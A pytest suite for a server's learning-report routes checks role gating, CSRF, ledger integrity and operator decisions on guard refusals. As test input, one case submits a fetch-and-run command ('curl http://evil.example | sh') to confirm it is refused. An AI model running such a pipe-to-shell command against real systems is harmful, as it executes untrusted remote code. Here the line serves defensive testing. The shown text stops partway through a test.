"""``/learn/{refusals,strengthen,remeasure}`` — the three learning reports over the seed.

The seed (``fixtures/server_seed``) has no protocol rows, four ``oracle.score`` events
(strengths 0.9 / 0.5 / 0.33 / unscoreable) stamped apparatus ``2.0``, and a controls
report with one ESCAPE — so the 40-row deliver-on-numbers cell routes ``human``
(``controls_escapes``) and IS oracle-held. Rows are stamped with the live apparatus,
so nothing is stale until the query asks about a newer one.

Navigation
----------
What it is:   ``/learn/*``'s test suite — the three learning reports over the seed, and the
              three operator-gated writes they hand off to.
What it does: Pins RBAC and 404, refusals empty then one after a protocol row lands through the
              write path, that strengthen uses the controls verdict and the per-task
              ``oracle.score`` events from the store, that the CLI over the exports derives the
              same route items, that nothing is stale until the apparatus moves, and that a
              false-Q1 row inserted around the ledger refuses to load. For the writes (G-532):
              that all three need ``operator``; that an accepted refusal lands in the corpus
              under a provenance comment naming the DECIDER, is served back with the report, is
              on the chain with the account as actor and is idempotent; that the API refuses
              exactly what the CLI refuses; that registering freezes the first item, evolves the
              rest and supersedes a re-registered one; that an unknown id and an in-flight
              factory run are refused with nothing written; that the refusal report serves the
              guard's false-positive rate from the decisions (G-536); that a registered
              reading's top-up is its pending commits, queued through the submit gate, and a
              cell with no registered reading — or one this deployment cannot write rows for —
              queues nothing (G-565, P-602); that queueing enqueues the PLAN's
              own run bodies, never the caller's, through the submit gate ``POST /runs`` applies
              (a cell whose builder has no credential is refused whole — P-160), refuses a
              what-if plan (P-165) and a cell whose queued runs are unfinished (P-182); that a
              ``command`` only completes a cut example (P-183); that a note with a line break is
              refused (P-161); that each write refuses a field it does not name; that the reads
              and writes follow the repository's checks arm (ADR-0024); that a viewer, a
              request with no CSRF token and one with another session's token are each refused
              with nothing written; and that the writes hold under concurrency — two queues of
              one cell spend once, a prevention record landing mid-queue costs nothing, two
              decisions at once are both on record, and two first registrations keep both
              items (EI-1, EI-7).
How:          ``make_env`` over the seed, with ``tests.fixtures.proven``'s qualified tasks and a
              reading registered through ``POST /readings`` for the top-up; a protocol row
              appended through ``DbLedger``; the CLI
              invoked over the API's own exports for the parity case; the writes driven through
              ``env.post`` and checked against ``GET /factory/{repo}/backlog``, ``GET /runs`` and
              the ``events`` table.
Layer:        tests — docs/ARCHITECTURE.md#44-outer-layers
ADRs:         docs/adr/0003-one-routing-rule.md
Works with:   src/crb/server/routes/learn.py (under test), src/crb/core/learn.py (the
              derivations and ``apply_triage`` — the writer both halves share),
              tests/test_cli_learn.py (the CLI half of the parity),
              tests/fixtures/server_seed.py (``make_env``, ``assert_rbac``, ``user_id``),
              tests/fixtures/concurrency.py (``pause_after`` / ``at_once`` — the staged races),
              src/crb/server/factory_state.py (the backlog the register write moves),
              docs/LEARNING-LOOP.md (the contract these writes implement), docs/API.md
Tested by:    tests/test_server_routes_learn.py
Touch when:   never for a new repository; a learn report gains a field (the CLI must read
              the export the same way — add the parity case); the event shapes the reports
              read change; a fourth write path lands (pin its role, its refusals and its event
              here).
"""

from __future__ import annotations

import json
import os
import threading
from collections.abc import Callable, Iterator
from pathlib import Path
from typing import Any

import pytest
from sqlalchemy import select

from crb.core.ledger import FAILURE_PROTOCOL, LABEL_FAILURE_KIND
from crb.core.version import APPARATUS_VERSION
from crb.store.ledger import DbLedger
from crb.store.models import Event, Grade, Run, Task
from fixtures.concurrency import at_once, pause_after
from fixtures.posture import dict_at_apparatus
from fixtures.proven import AUTHOR as PROVEN_AUTHOR
from fixtures.proven import CELL as PROVEN_CELL
from fixtures.proven import add_rows as add_proven_rows
from fixtures.proven import add_tasks as add_proven_tasks
from fixtures.proven import register_via_api
from fixtures.server_seed import (
    ALPHA,
    BETA,
    RUN_IDS,
    USERS,
    Env,
    assert_rbac,
    envelope,
    login,
    logout,
    make_env,
    task_id,
    user_id,
)

#: A refusal whose only recorded command was cut by the recorder's 120-character cap: the
#: class is ``truncated`` and a person must complete the line (``command``).
ERR_CUT = (
    "protocol violation: archaeology: could not parse the command safely (unbalanced "
    "substitution) (attempted: NODE_ENV=test NODE_PATH=$(pwd)/node_modules "
    "/opt/homebrew/bin/node --test --test-reporter=junit --test-reporter-destinat)"
)

ERR_NHS = (
    "protocol violation: archaeology: '.git' is off limits (.git) (attempted: find . -iname "
    '"*conftest*" -o -iname "*helpers*" | grep -v ".git"); network: \'curl\' is not allowed '
    "(no network access) (attempted: curl -sk https://localhost:8701/health)"
)


@pytest.fixture(autouse=True)
def _no_ambient_crb_env(monkeypatch: pytest.MonkeyPatch) -> None:
    for key in list(os.environ):
        if key.startswith("CRB_"):
            monkeypatch.delenv(key, raising=False)


@pytest.fixture
def env(tmp_path: Path) -> Iterator[Env]:
    """The seeded environment, logged in as admin, torn down after the test."""
    with make_env(tmp_path) as e:
        yield e


def _add_protocol_row(env: Env, error: str = ERR_NHS, task: str = "f" * 40) -> None:
    """Append one protocol row through the write path (chained, invariants checked)."""
    ledger = DbLedger(env.factory)
    template = next(r for r in ledger.rows(repo=ALPHA) if r.clean)
    d = template.to_dict()
    d.update(
        {
            "clean": False,
            "target_green": False,
            "no_new_failures": None,
            "source_changed": None,
            "evidence_pack_hash": "",
            "error": error,
            # the template's posture labels stay (ADR-0019: a 2.3 row names its posture)
            "labels": {
                **template.labels,
                "builder_error": error[:300],
                LABEL_FAILURE_KIND: FAILURE_PROTOCOL,
            },
            "row_id": "",
            "prev_hash": "",
            "row_hash": "",
            "task_id": task,
            "cost_usd": 0.21,
            "latency_s": 33.0,
        }
    )
    d.pop("failure_kind", None)
    d.pop("cost_known", None)
    from crb.core.ledger import GradeRow

    ledger.append(GradeRow.from_dict(d))


#: The plan cell :func:`_add_stale_rows` makes: a thin cell of the seed, its editblock rows
#: graded under apparatus 2.0 (belt set v4) — genuinely stale at the running apparatus.
STALE_CELL = "replay|backend.route.add|M|python|editblock|gpt-oss-120b|cerebras"


def _add_stale_rows(env: Env, n: int = 2, *, labels: dict[str, str] | None = None) -> None:
    """Append ``n`` rows of seed task 5 graded under apparatus 2.0 through the write path, so
    the plan AT THE RUNNING APPARATUS holds :data:`STALE_CELL` with rows of an older apparatus.
    ``labels`` are merged into the rows' own."""
    from crb.core.ledger import GradeRow

    ledger = DbLedger(env.factory)
    template = next(r for r in ledger.rows(repo=ALPHA) if r.clean and r.builder == "editblock")
    for i in range(n):
        d = template.to_dict()
        d.update(
            {
                "apparatus_version": "2.0",
                "belt_set": "v4",
                "task_id": task_id(5),
                "capability_class": "backend.route.add",
                "size": "M",
                "cost_usd": 0.3,
                "trial": f"stale{i}",
                "labels": {**template.labels, **(labels or {})},
                "row_id": "",
                "prev_hash": "",
                "row_hash": "",
            }
        )
        d.pop("failure_kind", None)
        d.pop("cost_known", None)
        ledger.append(GradeRow.from_dict(dict_at_apparatus(d, "2.0")))


def _legacy_cell(env: Env) -> str:
    """The seed's own stale cell at the running apparatus (apparatus 1.0-census rows)."""
    cells = env.get(f"/learn/remeasure?repo={ALPHA}").json()["cells"]
    return str(next(c["label"] for c in cells if c["stale_versions"] == ["1.0-census"]))


def test_rbac(env: Env) -> None:
    for path in ("/learn/refusals", "/learn/strengthen", "/learn/remeasure"):
        assert_rbac(env, "GET", f"{path}?repo={ALPHA}", min_role="viewer")


def test_unknown_repo_404(env: Env) -> None:
    r = env.get("/learn/refusals?repo=nope")
    assert r.status_code == 404 and envelope(r)["code"] == "not_found"


def test_refusals_empty_then_one(env: Env) -> None:
    r = env.get(f"/learn/refusals?repo={ALPHA}")
    assert r.status_code == 200, r.text
    d = r.json()
    assert d["repo"] == ALPHA and d["rows_protocol"] == 0 and d["groups"] == []
    _add_protocol_row(env)
    d = env.get(f"/learn/refusals?repo={ALPHA}").json()
    assert d["rows_protocol"] == 1 and len(d["groups"]) == 2
    assert all(g["verdict"] == "unsure" for g in d["groups"])
    shapes = {g["shape"] for g in d["groups"]}
    assert shapes == {'find . -iname "<str>" -o -iname "<str>" | grep -v "<str>"', "curl -sk <url>"}
    curl = next(g for g in d["groups"] if g["prefix"] == "network")
    assert curl["candidate_refused"] == "curl -sk https://localhost:8701/health\tnetwork:"
    assert curl["cost_usd"] == pytest.approx(0.21)
    # beta has no rows: honest-empty, not an error
    assert env.get(f"/learn/refusals?repo={BETA}").json()["rows_total"] == 0


def test_strengthen_uses_the_controls_verdict_and_the_oracle_scores(env: Env) -> None:
    r = env.get(f"/learn/strengthen?repo={ALPHA}")
    assert r.status_code == 200, r.text
    d = r.json()
    assert d["projection"] == "class_size" and "bug.fix|S" in d["cells_flagged"]
    items = [i for i in d["items"] if i["labels"]["cell"] == "bug.fix|S"]
    assert items, d
    assert all(i["capability_class"] == "test.add" for i in items)
    # routing.v2 holds the host cell first on its posture; the item names the clause a test
    # can fix — the seed's weak oracle (0.58), listed among the cell's shortfalls
    assert all(i["labels"]["reason_code"] == "oracle_weak" for i in items)
    weak = [
        i for i in items if i["labels"].get("oracle_strength") in ("0.50", "0.33", "unscoreable")
    ]
    assert weak, [i["labels"] for i in items]
    # the seed scores are stamped at the live apparatus: asking since it keeps them
    d2 = env.get(f"/learn/strengthen?repo={ALPHA}&since={APPARATUS_VERSION}").json()
    assert "bug.fix|S" in d2["cells_flagged"] and "bug.fix|S" not in d2["cells_without_scores"]
    r = env.get(f"/learn/strengthen?repo={ALPHA}&by=nope")
    assert r.status_code == 422


def test_strengthen_reads_per_task_scores_from_the_store_events(env: Env) -> None:
    """The per-task scores are the repo's ``oracle.score`` events (an oracle run's
    ``counts_json`` is only the cell roll-up): every item names a SEEDED scored task
    of the held cell, carries the repo, and the strengths are the seed's."""
    d = env.get(f"/learn/strengthen?repo={ALPHA}").json()
    items = [i for i in d["items"] if i["labels"]["cell"] == "bug.fix|S"]
    with env.factory() as session:
        scored = {
            ev.task_id: dict(ev.payload_json or {})
            for ev in session.execute(
                select(Event).where(Event.repo == ALPHA, Event.action == "oracle.score")
            ).scalars()
            if (ev.payload_json or {}).get("capability_class") == "bug.fix"
        }
    assert items and {i["labels"]["task_id"] for i in items} <= set(scored)
    assert all(i["labels"]["repo"] == ALPHA for i in items)
    assert all(i["labels"]["reason_code"] == "oracle_weak" for i in items)
    for i in items:
        payload = scored[i["labels"]["task_id"]]
        assert i["labels"]["mutants"] == str(payload["total"])
        assert i["labels"]["escaped"] == str(payload["total"] - payload["killed"])
    assert "bug.fix|S" not in d["cells_without_scores"]
    # the item id is sha(cell, repo, task): stable across reads
    assert [i["id"] for i in d["items"]] == [
        i["id"] for i in env.get(f"/learn/strengthen?repo={ALPHA}").json()["items"]
    ]


def test_cli_over_the_exports_derives_the_route_items(
    env: Env, tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """A ledger export is the rows alone: over it the CLI honestly flags nothing, even
    with the scores — the cell is held by the controls verdict. Given the two exports
    the route reads from the store (``GET /oracle/{repo}`` and
    ``GET /oracle/{repo}/controls``) the CLI derives the SAME items with the SAME ids;
    the oracle run's ``events/log`` page is an equivalent source of the scores."""
    from crb.cli.main import main

    route = env.get(f"/learn/strengthen?repo={ALPHA}").json()
    want = sorted(
        (i["id"], i["labels"]["task_id"], i["labels"]["oracle_strength"]) for i in route["items"]
    )
    assert want
    ledger = tmp_path / "ledger.jsonl"
    ledger.write_text(env.get(f"/ledger/export?repo={ALPHA}&format=jsonl").text, encoding="utf-8")
    oracle = tmp_path / "oracle.json"
    oracle.write_text(env.get(f"/oracle/{ALPHA}").text, encoding="utf-8")
    controls = tmp_path / "controls.json"
    controls.write_text(env.get(f"/oracle/{ALPHA}/controls").text, encoding="utf-8")
    events = tmp_path / "events.json"
    events.write_text(
        env.get(f"/runs/{RUN_IDS['oracle']}/events/log?limit=200").text, encoding="utf-8"
    )

    def cli(*extra: str) -> dict[str, Any]:
        capsys.readouterr()
        argv = ["learn", "strengthen", "--path", str(ledger), "--json", "--workdir", str(tmp_path)]
        code = main([*argv, *extra])
        out = capsys.readouterr()
        assert code == 0, out.err
        return dict(json.loads(out.out))

    bare = cli("--oracle", str(oracle))
    with_controls = cli("--oracle", str(oracle), "--controls", str(controls))
    from_events = cli("--oracle", str(events), "--controls", str(controls))
    # the oracle export alone holds the weak-oracle cell (routing.v2 reads the per-task
    # scores); the thin cell is held by the controls escape, which only that export carries
    assert bare["cells_flagged"] == ["bug.fix|S"] and bare["controls"] is None
    assert {i["labels"]["cell"] for i in bare["items"]} == {"bug.fix|S"}
    for d in (with_controls, from_events):
        got = sorted(
            (i["id"], i["labels"]["task_id"], i["labels"]["oracle_strength"]) for i in d["items"]
        )
        assert got == want
        assert d["cells_flagged"] == route["cells_flagged"]
        assert d["controls"]["escapes"] == 1 and d["controls"]["measured"] is True


def test_remeasure_nothing_stale_until_the_apparatus_moves(env: Env) -> None:
    d = env.get(f"/learn/remeasure?repo={ALPHA}").json()
    assert d["current_apparatus"] == APPARATUS_VERSION
    # only the legacy cell (apparatus 1.0-census) is older than the live instrument; every
    # other cell in the plan is there because it is short of the first look (G-565)
    stale = [c for c in d["cells"] if c["reason"] == "stale"]
    assert [c["stale_versions"] for c in stale] == [["1.0-census"]]
    assert all(c["stale_versions"] == [] for c in d["cells"] if c["reason"] == "thin")
    assert d["summary"]["cells_stale"] == 1
    d2 = env.get(f"/learn/remeasure?repo={ALPHA}&apparatus=9.9").json()
    assert d2["rows_stale"] == d2["rows_total"] and len(d2["cells"]) >= 3
    for c in d2["cells"]:
        for req in c["requests"]:
            assert req["repo"] == ALPHA and req["kind"] in ("replay", "blind")
    assert "nothing here was sent" in d2["note"]


def test_false_q1_row_refuses_to_load(env: Env) -> None:
    """A false-Q1 row inserted straight through the ORM (bypassing DbLedger — the table
    is append-only, so an UPDATE is impossible) makes every learn route answer 409."""
    with env.factory() as s:
        s.add(
            Grade(
                row_id="bad-row",
                schema="crb.grade.v2",
                repo=ALPHA,
                task_id="deadbeef" * 5,
                created="2026-09-01T00:00:00+00:00",
                clean=True,
                tests_unmodified=True,
                target_green=False,
                no_new_failures=True,
                source_changed=True,
                capability_class="docs.update",
                size="S",
                language="python",
                evidence_pack_hash="p" * 64,
                apparatus_version="2.0",
                belt_set="v4",
                prev_hash="x" * 64,
                row_hash="y" * 64,
            )
        )
        s.commit()
    for path in ("/learn/refusals", "/learn/strengthen", "/learn/remeasure"):
        r = env.get(f"{path}?repo={ALPHA}")
        assert r.status_code == 409, (path, r.text)
        assert envelope(r)["code"] == "false_q1_refused"


# ---------------------------------------------------------------------------
# The three writes (G-532): a named operator's decision, from the report that computed it
# ---------------------------------------------------------------------------


def _accept(env: Env, group_id: str, verdict: str, **extra: Any) -> Any:
    return env.post(
        f"/learn/refusals/accept?repo={ALPHA}",
        json={"group_id": group_id, "verdict": verdict, **extra},
    )


def _group(env: Env, prefix: str) -> dict[str, Any]:
    """One refusal class of ALPHA's current report, by guard family."""
    groups = env.get(f"/learn/refusals?repo={ALPHA}").json()["groups"]
    return next(g for g in groups if g["prefix"] == prefix)


def test_the_three_writes_are_operator_gated(env: Env) -> None:
    """Reading the reports is a viewer's; deciding is an operator's — at the API, not only
    in the UI. The bodies are the smallest valid ones: RBAC is checked before they are."""
    _add_protocol_row(env)
    gid = _group(env, "archaeology")["group_id"]
    assert_rbac(
        env,
        "POST",
        f"/learn/refusals/accept?repo={ALPHA}",
        min_role="operator",
        json={"group_id": gid, "verdict": "honest"},
    )
    item_id = env.get(f"/learn/strengthen?repo={ALPHA}").json()["items"][0]["id"]
    assert_rbac(
        env,
        "POST",
        f"/learn/strengthen/register?repo={ALPHA}",
        min_role="operator",
        json={"item_ids": [item_id]},
    )
    assert_rbac(
        env,
        "POST",
        f"/learn/remeasure/queue?repo={ALPHA}",
        min_role="operator",
        json={"cell": _legacy_cell(env)},
    )


def _learn_writes(env: Env) -> list[tuple[str, dict[str, Any]]]:
    """The three writes with the smallest bodies the current reports make valid."""
    gid = _group(env, "archaeology")["group_id"]
    item_id = env.get(f"/learn/strengthen?repo={ALPHA}").json()["items"][0]["id"]
    return [
        (f"/learn/refusals/accept?repo={ALPHA}", {"group_id": gid, "verdict": "refuse"}),
        (f"/learn/strengthen/register?repo={ALPHA}", {"item_ids": [item_id]}),
        (f"/learn/remeasure/queue?repo={ALPHA}", {"cell": _legacy_cell(env)}),
    ]


def _nothing_written(env: Env, runs_before: int) -> None:
    """No learn event on the chain, no corpus file, no backlog and no new run."""
    with env.factory() as s:
        learn_events = list(s.execute(select(Event).where(Event.action.like("learn.%"))).scalars())
    assert learn_events == []
    assert not (env.settings.home / "learn" / "corpus").exists()
    assert env.get(f"/factory/{ALPHA}/backlog").status_code == 404
    assert env.get("/runs").json()["total"] == runs_before


def test_a_viewer_is_refused_every_learn_write_and_nothing_is_written(env: Env) -> None:
    """Operator-gated at the SERVER: a viewer who posts the body the operator's screen would
    post is refused 403 ``forbidden``, and the refusal leaves nothing behind — no corpus
    line, no backlog item, no run and no event. The UI hiding the three controls is a
    convenience; this is the gate."""
    _add_protocol_row(env)
    writes = _learn_writes(env)
    runs_before = env.get("/runs").json()["total"]
    logout(env.client)
    login(env.client, "viewer")
    for path, body in writes:
        r = env.post(path, json=body)
        assert r.status_code == 403, (path, r.text)
        assert envelope(r)["code"] == "forbidden", (path, r.text)
    login(env.client, "admin")
    _nothing_written(env, runs_before)


def test_every_learn_write_needs_this_sessions_csrf_token(env: Env) -> None:
    """#52's session rules hold on the three writes: an operator's request with no
    ``X-CSRF-Token``, or with ANOTHER session's token, is refused 403 ``csrf_failed`` before
    the route runs, so nothing is written. The token is bound to the session (``HMAC(secret,
    uid, cv)``), so a token lifted from a viewer's page cannot carry an operator's decision."""
    _add_protocol_row(env)
    writes = _learn_writes(env)
    runs_before = env.get("/runs").json()["total"]
    logout(env.client)
    login(env.client, "viewer")
    viewer_token = env.client.headers["X-CSRF-Token"]
    logout(env.client)
    login(env.client, "operator")
    own_token = env.client.headers.pop("X-CSRF-Token")
    assert own_token != viewer_token
    for path, body in writes:
        missing = env.post(path, json=body)
        assert missing.status_code == 403, (path, missing.text)
        assert envelope(missing)["code"] == "csrf_failed", (path, missing.text)
        foreign = env.post(path, json=body, headers={"X-CSRF-Token": viewer_token})
        assert foreign.status_code == 403, (path, foreign.text)
        assert envelope(foreign)["code"] == "csrf_failed", (path, foreign.text)
    env.client.headers["X-CSRF-Token"] = own_token
    _nothing_written(env, runs_before)
    # and with its own token the same operator's decision goes through
    path, body = writes[0]
    assert env.post(path, json=body).status_code == 201


def test_accepting_a_refusal_writes_the_line_under_the_operators_name(env: Env) -> None:
    """The verdict the report never makes, made once on the screen's behalf: the line lands
    in the corpus under a provenance comment that names WHO decided, the decision is served
    back with the report, and repeating it writes nothing."""
    _add_protocol_row(env)
    group = _group(env, "archaeology")
    r = _accept(env, group["group_id"], "honest", note=".git inside a quoted argument")
    assert r.status_code == 201, r.text
    d = r.json()
    assert d["decided_by"] == USERS["admin"] and d["verdict"] == "honest"
    assert d["honest_added"] == [group["candidate_honest"]] and d["refused_added"] == []
    assert d["already_present"] is False
    corpus = Path(d["honest_path"])
    assert corpus.is_file()
    text = corpus.read_text(encoding="utf-8")
    assert group["candidate_honest"] in text
    assert f"(honest→{USERS['admin']})" in text and "quoted argument" in text
    # the decision is now part of what the report serves — nobody has to remember it
    served = env.get(f"/learn/refusals?repo={ALPHA}").json()["decisions"]
    assert [x["group_id"] for x in served] == [group["group_id"]]
    assert served[0]["decided_by"] == USERS["admin"] and served[0]["verdict"] == "honest"
    assert served[0]["lines"] == [group["candidate_honest"]]
    # and it is on the chain, once, with the actor
    with env.factory() as s:
        events = list(
            s.execute(
                select(Event).where(Event.action == "learn.refusal.accepted", Event.repo == ALPHA)
            ).scalars()
        )
    assert len(events) == 1 and events[0].actor == user_id(USERS["admin"])
    assert events[0].payload_json["guard"] == "archaeology"
    # idempotent: the same decision again adds nothing and says the line was already there
    again = _accept(env, group["group_id"], "honest")
    assert again.status_code == 201, again.text
    assert again.json()["honest_added"] == [] and again.json()["already_present"] is True
    assert corpus.read_text(encoding="utf-8") == text


def test_the_refusal_report_serves_the_guard_false_positive_rate_from_the_decisions(
    env: Env,
) -> None:
    """G-536: ``GET /learn/refusals`` serves the guard's false-positive rate per apparatus and
    month, derived from the ``learn.refusal.accepted`` events. The seed's row carries two
    classes: while one is undecided the row is undecided (the rate is the bound [0, 1]); once
    one is decided refuse, the guard was right to stop the row."""
    _add_protocol_row(env)

    def fp() -> dict[str, Any]:
        out: dict[str, Any] = env.get(f"/learn/refusals?repo={ALPHA}").json()["false_positives"]
        return out

    (period,) = fp()["periods"]
    assert period["apparatus_version"] == APPARATUS_VERSION
    assert (period["rows_protocol"], period["honest"], period["refuse"], period["undecided"]) == (
        1,
        0,
        0,
        1,
    )
    assert (period["rate_low"], period["rate_high"]) == (0.0, 1.0)
    assert _accept(env, _group(env, "archaeology")["group_id"], "honest").status_code == 201
    assert (fp()["undecided"], fp()["decided_groups"], fp()["undecided_groups"]) == (1, 1, 1)
    assert _accept(env, _group(env, "network")["group_id"], "refuse").status_code == 201
    (period,) = fp()["periods"]
    assert (period["honest"], period["refuse"], period["undecided"]) == (0, 1, 0)
    assert (period["rate_low"], period["rate_high"]) == (0.0, 0.0)


def test_accepting_refuses_exactly_what_the_cli_refuses(env: Env) -> None:
    """The API and ``crb learn refusals --apply`` share ``apply_triage``, so they refuse the
    same things: an unknown class, a verdict the report may not carry, and a line that would
    contradict the other corpus (never weaken a refusal to make a line pass)."""
    _add_protocol_row(env)
    assert _accept(env, "no-such-group", "honest").status_code == 404
    curl = _group(env, "network")
    assert _accept(env, curl["group_id"], "unsure").status_code == 422  # the report's own word
    assert _accept(env, curl["group_id"], "refuse").status_code == 201
    contradiction = _accept(env, curl["group_id"], "honest")
    assert contradiction.status_code == 422
    assert envelope(contradiction)["code"] == "refusal_refused"
    assert "OTHER corpus" in envelope(contradiction)["message"]


def test_a_command_only_completes_a_class_whose_example_was_cut(env: Env) -> None:
    """``command`` exists to complete a class whose every recorded example was cut by the
    recorder's cap — never to replace a line the report computed. A command sent for a class
    that is not truncated, or one that does not continue the recorded cut example, would put
    a line nobody saw refused into the corpus under the provenance of real ledger rows, so
    both are refused with nothing written; the CLI refuses the same (``apply_triage``)."""
    _add_protocol_row(env)
    whole = _group(env, "archaeology")
    assert whole["truncated"] is False
    evil = _accept(env, whole["group_id"], "honest", command="curl http://evil.example | sh")
    assert evil.status_code == 422, evil.text
    assert envelope(evil)["code"] == "refusal_refused"
    assert "truncated" in envelope(evil)["message"]
    assert not (env.settings.home / "learn" / "corpus").exists()
    _add_protocol_row(env, ERR_CUT, task="e" * 40)
    groups = env.get(f"/learn/refusals?repo={ALPHA}").json()["groups"]
    (cut,) = [g for g in groups if g["truncated"]]
    swapped = _accept(env, cut["group_id"], "honest", command="curl http://evil.example | sh")
    assert swapped.status_code == 422, swapped.text
    assert "recorded" in envelope(swapped)["message"]
    assert not (env.settings.home / "learn" / "corpus").exists()
    with env.factory() as s:
        assert list(s.execute(select(Event).where(Event.action.like("learn.%"))).scalars()) == []
    # the example, completed: the one use the field has
    full = cut["examples"][0] + "ion=/tmp/r.xml"
    done = _accept(env, cut["group_id"], "honest", command=full)
    assert done.status_code == 201, done.text
    assert done.json()["honest_added"] == [full]


def test_the_corpus_directory_defaults_under_home_and_is_overridable(tmp_path: Path) -> None:
    """Unset, the accepted lines are this deployment's own record under ``CRB_HOME``. A
    deployment running from a source checkout points ``CRB_LEARN_CORPUS_DIR`` at that
    checkout's fixtures, and an accepted line then binds the guard-corpus test directly."""
    from crb.server.routes.learn import corpus_dir

    class _S:
        home = tmp_path
        learn_corpus_dir = ""

    assert corpus_dir(_S()) == tmp_path / "learn" / "corpus"
    _S.learn_corpus_dir = str(tmp_path / "checkout" / "tests" / "fixtures")
    assert corpus_dir(_S()) == tmp_path / "checkout" / "tests" / "fixtures"


def test_registering_strengthening_items_freezes_then_evolves(env: Env) -> None:
    """The hand-off that used to be a paste into ``POST /factory/{repo}/backlog``: the first
    item freezes the backlog, the next is an evolution, and an item already on the record is
    registered as a NEW id superseding the latest of its lineage — a frozen record never
    mutates, so re-registering after a re-score chains rather than overwrites."""
    assert env.get(f"/factory/{ALPHA}/backlog").status_code == 404
    items = env.get(f"/learn/strengthen?repo={ALPHA}").json()["items"]
    assert len(items) >= 2, items
    first, second = items[0]["id"], items[1]["id"]
    r = env.post(f"/learn/strengthen/register?repo={ALPHA}", json={"item_ids": [first, second]})
    assert r.status_code == 201, r.text
    d = r.json()
    assert [x["how"] for x in d["registered"]] == ["frozen", "evolved"]
    assert [x["item_id"] for x in d["registered"]] == [first, second]
    assert all(x["supersedes"] == "" for x in d["registered"])
    backlog = env.get(f"/factory/{ALPHA}/backlog").json()
    assert backlog["hash"] == d["backlog_hash"]
    ids = [i["id"] for i in backlog["items"]]
    assert first in ids and second in ids
    # the same item again: a new id that supersedes the one on the record
    again = env.post(f"/learn/strengthen/register?repo={ALPHA}", json={"item_ids": [first]})
    assert again.status_code == 201, again.text
    row = again.json()["registered"][0]
    assert (
        row["item_id"] == f"{first}-v2" and row["supersedes"] == first and row["how"] == "evolved"
    )
    # a third registration chains onto the SECOND, never onto the superseded first
    third = env.post(f"/learn/strengthen/register?repo={ALPHA}", json={"item_ids": [first]}).json()
    assert third["registered"][0]["supersedes"] == f"{first}-v2"
    with env.factory() as s:
        events = list(
            s.execute(
                select(Event).where(
                    Event.action == "learn.strengthen.registered", Event.repo == ALPHA
                )
            ).scalars()
        )
    assert len(events) == 3 and all(e.actor == user_id(USERS["admin"]) for e in events)
    assert events[0].payload_json["items"][0]["item_id"] == first


def test_registering_refuses_an_unknown_id_and_a_factory_run_in_flight(env: Env) -> None:
    """The body names ids and nothing else, so an id the report does not hold is refused
    before anything is written; and the backlog a queued run verifies against cannot change
    under it."""
    bad = env.post(f"/learn/strengthen/register?repo={ALPHA}", json={"item_ids": ["strengthen-x"]})
    assert bad.status_code == 422 and envelope(bad)["code"] == "validation_error"
    assert envelope(bad)["detail"]["unknown"] == ["strengthen-x"]
    item_id = env.get(f"/learn/strengthen?repo={ALPHA}").json()["items"][0]["id"]
    with env.factory() as s:
        s.add(Run(id="ab" * 16, repo=ALPHA, kind="factory", status="queued", mode="sighted"))
        s.commit()
    blocked = env.post(f"/learn/strengthen/register?repo={ALPHA}", json={"item_ids": [item_id]})
    assert blocked.status_code == 409 and envelope(blocked)["code"] == "factory_run_active"
    assert env.get(f"/factory/{ALPHA}/backlog").status_code == 404  # nothing was written


@pytest.fixture
def builder_keys(monkeypatch: pytest.MonkeyPatch) -> None:
    """Placeholder builder credentials, as tests/test_server_routes_runs.py sets them: the
    submit gate checks PRESENCE only, so a queue test that passes proves the gate was met."""
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-test-placeholder-not-a-key")
    monkeypatch.setenv("CEREBRAS_API_KEY", "csk-test-placeholder-not-a-key")


def _queue(env: Env, **body: Any) -> Any:
    return env.post(f"/learn/remeasure/queue?repo={ALPHA}", json=body)


def _queued_events(env: Env) -> list[Event]:
    with env.factory() as s:
        return list(
            s.execute(
                select(Event).where(Event.action == "learn.remeasure.queued", Event.repo == ALPHA)
            ).scalars()
        )


#: The cell a registered reading reads in these tests (``tests.fixtures.proven``): 40
#: qualified commits of bug.fix × XS on the seed's editblock builder, so a run needs a
#: builder credential and meets the submit gate on its own merits.
READ_CELL = "|".join(PROVEN_CELL.values())


def _sealed(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    """This deployment grades in the sealed posture the reading counts (docker, copy tree)."""
    monkeypatch.setattr(env.settings.sandbox, "executor", "docker")


def _add_reading(env: Env, *, graded: int = 0, hierarchy: tuple[str, ...] = ("S3",)) -> Any:
    """40 qualified commits of :data:`READ_CELL`, a reading registered over them through
    ``POST /readings``, and a clean sealed first attempt on the first ``graded`` of its seeded
    order, graded after the registration. Returns the reading as the route served it."""
    add_proven_tasks(env.factory)
    r = register_via_api(env, hierarchy=hierarchy)
    assert r.status_code == 201, r.text
    reading = r.json()
    if graded:
        add_proven_rows(env.factory, reading["pool"][:graded], arm="S3")
    return reading


def _read_cell(env: Env) -> dict[str, Any]:
    plan = env.get(f"/learn/remeasure?repo={ALPHA}").json()
    return next(c for c in plan["cells"] if c["label"] == READ_CELL)


def test_queueing_a_readings_top_up_enqueues_its_pending_commits_through_the_submit_gate(
    env: Env, builder_keys: None, monkeypatch: pytest.MonkeyPatch
) -> None:
    """G-565, P-602: a cell whose registered reading waits on its look is offered its top-up —
    the commits the reading still needs, in its seeded order, priced — and queued from one act:
    the plan's own body, put to the submit gate ``POST /runs`` applies before it is enqueued,
    recorded with the operator's identity, the arm and the reading. A pending commit that is
    no longer gold-clean is left out: the worker would skip it."""
    del builder_keys
    from crb.server.routes import learn as learn_routes

    _sealed(env, monkeypatch)
    reading = _add_reading(env, graded=12)
    pool = reading["pool"]
    with env.factory() as s:
        task = s.get(Task, (ALPHA, pool[13]))
        assert task is not None
        task.gold_clean = False
        s.commit()
    cell = _read_cell(env)
    assert (cell["reason"], cell["next_act"], cell["arm"], cell["mode"]) == (
        "look_pending",
        "replay",
        "S3",
        "sighted",
    )
    assert (cell["n_current"], cell["next_look"], cell["n_needed"]) == (12, 20, 8)
    assert cell["reading_id"] == reading["reading_id"]
    (request,) = cell["requests"]
    assert request["task_ids"] == [pool[12], *pool[14:20]] and pool[13] not in request["task_ids"]
    assert request["learning"] == "off" and request["kind"] == "replay"
    assert (cell["n_requested"], cell["short_by"]) == (7, 1) and "gold-clean" in cell["note"]
    gated: list[str] = []
    real_gate = learn_routes.submit_refusals

    def gate(db: Any, settings: Any, validated: Any, run: Any) -> None:
        gated.append(run.id)
        real_gate(db, settings, validated, run)

    monkeypatch.setattr(learn_routes, "submit_refusals", gate)
    before = env.get("/runs").json()["total"]
    r = _queue(env, cell=READ_CELL)
